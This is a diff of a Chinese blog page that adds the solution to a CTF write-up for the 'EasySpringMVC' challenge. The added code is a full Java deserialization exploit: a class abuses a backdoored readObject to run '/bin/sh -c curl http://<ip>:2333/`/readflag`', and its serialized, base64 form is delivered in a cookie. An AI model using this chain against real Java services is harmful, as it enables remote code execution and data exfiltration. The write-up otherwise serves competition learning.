@@ -135,6 +135,10 @@
                     
                     <a class="navbar-item" href="#EasySpringMVC">4&nbsp;&nbsp;<b>EasySpringMVC</b></a>
                     
+                    
+                    
+                    <a class="navbar-item" href="#解题">4.1&nbsp;&nbsp;解题</a>
+                    
                 </div>
             </div>
             
@@ -167,7 +171,7 @@
     <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
             <span class="column is-narrow">
         
-                  <b><time datetime="2020-02-29T09:50:47.432Z" itemprop="datePublished">Feb 29 2020</time></b> updated
+                  <b><time datetime="2020-02-29T17:04:07.760Z" itemprop="datePublished">Mar 1 2020</time></b> updated
         
             </span>
         
@@ -180,7 +184,7 @@
     </div>
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-        <html><head></head><body><blockquote class="colorquote info"><p>给赵师傅递茶, 后面多花点时间在JAVA上吧</p>
+        <html><head></head><body><blockquote class="colorquote info"><p>给赵师傅递茶, AK是不可能AK的</p>
 </blockquote>
 
 <a id="more"></a>
@@ -315,6 +319,24 @@
 <p>但是这题是需要RCE的, 有个<code>/readflag</code></p>
 <p>这个题做了一天, 都没有进展, 尝试了很多后缀名, 但是都无法解析</p>
 <p>AK这辈子都不可能AK的</p>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>临近结束的时候看到了洞hhh</p>
+<p>在Tools类的这里</p>
+<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301004955.png" alt></p>
+<p>其实就是个后门, 但是一直没注意到(x, 要利用这个函数的话, 我们需要反序列化一个<code>Tools</code>类</p>
+<p>然后问题就来了, 打到比赛结束一直没成功, 和<strong>@杨大树</strong>以及<strong>@P3rh4ps</strong>两位师傅交流了一下, 可以通过重写writeObject方法来实现</p>
+<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301005525.png" alt></p>
+<p>或者这里也可以直接写</p>
+<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301005552.png" alt></p>
+<p>道理都是一样的, 都是通过构造一个<code>String[]</code>对象来传给<code>ProcessBuilder</code>进行执行, 执行的部分则是将需要空格分隔的地方, 分隔成不同的字符串, 例如</p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c "curl http://ip:port/`/readflag`"</span><br><span class="line">{"/bin/sh", "-c", "curl http://ip:port/`/readflag`"}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>完整的exp如下</p>
+<p></p><figure class="highlight java hljs"><figcaption><span>Tools.java</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="hljs-keyword">return</span> ois.readObject();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">private</span> String[] testcall={<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"curl http://174.0.218.211:2333/`/readflag`"</span>};</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] create(Object obj) <span class="hljs-keyword">throws</span> Exception {</span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="hljs-keyword">return</span> bos.toByteArray();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="hljs-keyword">new</span> ProcessBuilder((String[]) obj)).start();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        String[] cmd = {<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"curl http://174.0.218.211:2333/`/readflag`"</span>};</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>生成的部分</p>
+<p></p><figure class="highlight java hljs"><figcaption><span>exp.java</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.io.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="hljs-keyword">import</span> com.tools.*;</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">		<span class="hljs-keyword">try</span> {</span><br><span class="line">            Tools cinfo = <span class="hljs-keyword">new</span> Tools();</span><br><span class="line">            <span class="hljs-keyword">byte</span>[] bytes = Tools.create(cinfo);</span><br><span class="line">            String payload = encoder.encodeToString(bytes);</span><br><span class="line">            System.out.println(payload);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>重新下发了一个环境, 将生成的部分放到cookie, 就可以接受flag了</p>
+<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301005934.png" alt></p>
+<p>或者将输出写到<code>/tmp/</code>下, 然后通过任意文件读拿flag也可</p>
+<p>再次感谢两位师傅的帮助和赵师傅的题目</p>
 <p><br></p><blockquote class="colorquote info"><p>本文作者：cjm00n<br>本文地址： <a href="https://cjm00n.top/2020/02/29/V-N招新赛2020-writeup/">https://cjm00n.top/2020/02/29/V-N招新赛2020-writeup/</a> <br>版权声明：除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
 </blockquote><p></p>
 </body></html>
